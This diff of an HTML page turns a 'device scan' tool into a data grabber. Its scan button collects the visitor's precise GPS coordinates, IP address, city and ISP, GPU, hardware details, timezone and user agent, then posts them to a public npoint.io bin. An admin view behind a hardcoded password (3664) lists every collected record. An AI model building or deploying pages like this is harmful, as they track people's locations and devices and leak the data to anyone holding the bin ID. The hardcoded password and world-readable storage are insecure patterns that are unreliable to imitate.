@@ -3,82 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultimate Admin Panel</title>
+    <title>System Protocol v4.0</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #020617; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .box { background: #1e293b; padding: 25px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
-        h2 { color: #38bdf8; margin-bottom: 20px; text-transform: uppercase; font-size: 1.2rem; }
-        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 13px; }
-        .btn-blue { background: #0284c7; color: white; }
-        .btn-green { background: #10b981; color: white; }
-        .btn-red { background: #ef4444; color: white; margin-top: 20px; }
-        #status { font-size: 11px; color: #94a3b8; margin: 10px 0; }
-        #results { margin-top: 20px; text-align: left; background: #000; padding: 15px; border-radius: 12px; display: none; max-height: 400px; overflow-y: auto; border: 1px solid #1e293b; font-size: 11px; }
-        .entry { border-bottom: 1px solid #1e293b; padding: 12px 0; line-height: 1.6; }
+        body { font-family: 'Segoe UI', sans-serif; background: #020617; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
+        .box { background: #1e293b; padding: 25px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
+        h2 { color: #38bdf8; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; font-size: 1.1rem; }
+        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 13px; }
+        .btn-blue { background: #0284c7; color: white; box-shadow: 0 4px 15px rgba(2, 132, 199, 0.3); }
+        .btn-green { background: #10b981; color: white; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); }
+        .btn-red { background: #ef4444; color: white; margin-top: 20px; display: none; }
+        #status { font-size: 11px; color: #64748b; margin: 10px 0; font-family: monospace; }
+        #results { margin-top: 20px; text-align: left; background: #000; padding: 15px; border-radius: 12px; display: none; max-height: 450px; overflow-y: auto; border: 1px solid #1e293b; font-size: 10px; line-height: 1.6; }
+        .entry { border-bottom: 1px solid #1e293b; padding: 12px 0; }
         .entry b { color: #38bdf8; }
-        hr { border: 0; border-top: 1px solid #334155; margin: 10px 0; }
+        .highlight { color: #fbbf24; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>System Intelligence</h2>
-    <button class="btn-blue" id="mainBtn" onclick="fullScan()">О МОЕМ УСТРОЙСТВЕ</button>
-    <button class="btn-green" onclick="viewLogs()">ПАНЕЛЬ УПРАВЛЕНИЯ</button>
-    <div id="status">Система готова</div>
+    <h2>Terminal Access</h2>
+    <button class="btn-blue" onclick="deepScan()">ВЫПОЛНИТЬ ПОЛНЫЙ СКАН</button>
+    <button class="btn-green" onclick="adminAccess()">ПАНЕЛЬ УПРАВЛЕНИЯ</button>
+    <div id="status">READY_TO_SCAN</div>
     <div id="results"></div>
-    <button class="btn-red" id="clearBtn" onclick="clearDatabase()" style="display:none;">ОЧИСТИТЬ ВСЮ ПАМЯТЬ БАЗЫ</button>
+    <button class="btn-red" id="clearBtn" onclick="wipeData()">WIPE ALL CLOUD DATA</button>
 </div>
 
 <script>
-    const BIN_ID = "970512ab12c9b4a48cfd"; // Твой ID
+    const BIN_ID = "970512ab12c9b4a48cfd";
     const API_URL = `https://api.npoint.io/${BIN_ID}`;
 
-    async function fullScan() {
-        const status = document.getElementById('status');
-        status.innerText = "Сканирование системы...";
+    function getGPU() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+        } catch (e) { return "Blocked/Unsupported"; }
+    }
+
+    async function deepScan() {
+        const st = document.getElementById('status');
+        st.innerText = "INITIALIZING_DEEP_SCAN...";
         
         let data = {
-            date: new Date().toLocaleString("ru-RU"),
-            gps: "Нет доступа",
-            battery: "Загрузка...",
-            network: {},
-            hardware: {}
+            ts: new Date().toLocaleString("ru-RU"),
+            location: { gps: "SEARCHING...", ip: "FETCHING..." },
+            hardware: {
+                gpu: getGPU(),
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
+                screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
+                touchPoints: navigator.maxTouchPoints || 0
+            },
+            software: {
+                os: navigator.platform,
+                lang: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                dnt: navigator.doNotTrack === "1" ? "ON" : "OFF",
+                ua: navigator.userAgent
+            },
+            battery: "N/A"
         };
 
         // 1. Точный GPS
         const getGPS = () => new Promise(r => {
             navigator.geolocation.getCurrentPosition(
-                p => r(`${p.coords.latitude}, ${p.coords.longitude} (Точность: ${p.coords.accuracy}м)`),
-                () => r("Запрещено пользователем"),
-                { enableHighAccuracy: true, timeout: 5000 }
+                p => r(`${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`),
+                () => r("ACCESS_DENIED"),
+                { enableHighAccuracy: true, timeout: 6000 }
             );
         });
-        data.gps = await getGPS();
+        data.location.gps = await getGPS();
 
         // 2. Батарея
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Разрядка'})`;
+            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
         }
 
-        // 3. Сеть и IP
+        // 3. Сеть
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const json = await res.json();
-            data.network = { ip: json.ip, city: json.city, isp: json.org };
-        } catch(e) { data.network = { ip: "Ошибка" }; }
+            const ip = await res.json();
+            data.location.ip = `${ip.ip} (${ip.city}, ${ip.country_name})`;
+            data.location.isp = ip.org;
+        } catch(e) { data.location.ip = "CONNECTION_ERROR"; }
 
-        // 4. Железо
-        data.hardware = {
-            os: navigator.platform,
-            cores: navigator.hardwareConcurrency || "Неизвестно",
-            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Неизвестно",
-            screen: `${window.screen.width}x${window.screen.height}`,
-            ua: navigator.userAgent
-        };
-
-        // 5. Сохранение
+        // 4. Сохранение
+        st.innerText = "UPLOADING_ENCRYPTED_DATA...";
         try {
             const getDb = await fetch(API_URL);
             let db = await getDb.json();
@@ -90,53 +104,51 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(db)
             });
-            status.innerText = "Данные успешно переданы!";
-            alert("Данные устройства сохранены в облако!");
-        } catch(e) {
-            status.innerText = "Ошибка соединения";
-        }
+            st.innerText = "SCAN_COMPLETE_SUCCESS";
+            alert("Все доступные данные устройства успешно переданы в базу.");
+        } catch(e) { st.innerText = "UPLOAD_FAILED"; }
     }
 
-    async function viewLogs() {
-        const pass = prompt("Введите пароль администратора (3664):");
-        if (pass !== "3664") return;
+    async function adminAccess() {
+        const pass = prompt("ENTER ACCESS KEY:"); // Подсказка (3664) удалена
+        if (pass !== "3664") return alert("ACCESS DENIED");
 
         document.getElementById('clearBtn').style.display = 'block';
         const resDiv = document.getElementById('results');
         resDiv.style.display = 'block';
-        resDiv.innerHTML = "Загрузка логов...";
+        resDiv.innerHTML = "SYNCHRONIZING...";
 
         try {
             const res = await fetch(API_URL);
             const logs = await res.json();
-            if(!logs.length) return resDiv.innerHTML = "База пуста";
+            if(!logs.length) return resDiv.innerHTML = "DATABASE_EMPTY";
 
             resDiv.innerHTML = logs.reverse().map((l, i) => `
                 <div class="entry">
-                    <b>ЗАПИСЬ #${logs.length - i}</b><br>
-                    📅 ${l.date}<br>
-                    📍 <b>GPS:</b> ${l.gps}<br>
-                    🌐 <b>IP:</b> ${l.network.ip} (${l.network.city})<br>
-                    🏢 <b>Провайдер:</b> ${l.network.isp}<br>
-                    🔋 <b>Батарея:</b> ${l.battery}<br>
-                    💻 <b>Железо:</b> ${l.hardware.os}, ${l.hardware.cores} ядер, ${l.hardware.ram} RAM<br>
-                    📏 <b>Экран:</b> ${l.hardware.screen}
+                    <b class="highlight">ENTRY #${logs.length - i} [${l.ts}]</b><br>
+                    📍 <b>GPS:</b> ${l.location.gps}<br>
+                    🌐 <b>NET:</b> ${l.location.ip} / <small>${l.location.isp}</small><br>
+                    🔋 <b>BATTERY:</b> ${l.battery}<br>
+                    🎮 <b>GPU:</b> ${l.hardware.gpu}<br>
+                    🧠 <b>HW:</b> ${l.hardware.cores} Cores / ${l.hardware.ram} RAM / Touch: ${l.hardware.touchPoints}<br>
+                    🖥️ <b>OS/TZ:</b> ${l.software.os} / ${l.software.timezone}<br>
+                    <details><summary>USER_AGENT_STRING</summary>${l.software.ua}</details>
                 </div>
             `).join('');
-        } catch(e) { resDiv.innerHTML = "Ошибка чтения."; }
+        } catch(e) { resDiv.innerHTML = "FETCH_ERROR"; }
     }
 
-    async function clearDatabase() {
-        if (!confirm("Вы уверены, что хотите УДАЛИТЬ ВСЕ данные из облака?")) return;
+    async function wipeData() {
+        if (!confirm("PERMANENTLY WIPE CLOUD DATABASE?")) return;
         try {
             await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify([])
             });
-            alert("База данных полностью очищена!");
+            alert("DATABASE_WIPED");
             location.reload();
-        } catch(e) { alert("Ошибка очистки."); }
+        } catch(e) { alert("WIPE_FAILED"); }
     }
 </script>
 
